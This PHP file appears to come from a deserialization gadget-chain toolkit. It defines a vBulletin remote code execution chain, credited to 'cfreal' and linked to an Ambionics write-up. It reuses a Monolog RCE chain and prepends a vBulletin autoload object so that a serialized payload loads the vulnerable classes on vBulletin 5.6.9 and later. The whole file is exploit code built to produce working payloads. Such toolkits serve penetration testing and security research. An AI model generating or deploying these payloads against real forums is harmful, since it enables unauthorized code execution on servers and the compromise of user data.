<?php

namespace GadgetChain\vBulletin;

require_once(__DIR__ . "/../../../Monolog/RCE/1/chain.php");

# See https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable
class RCE1 extends \GadgetChain\Monolog\RCE1
{
    public static $version = '-5.6.9+';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        return [
            new \googlelogin_vendor_autoload(),
            parent::generate($parameters)
        ];
    }
}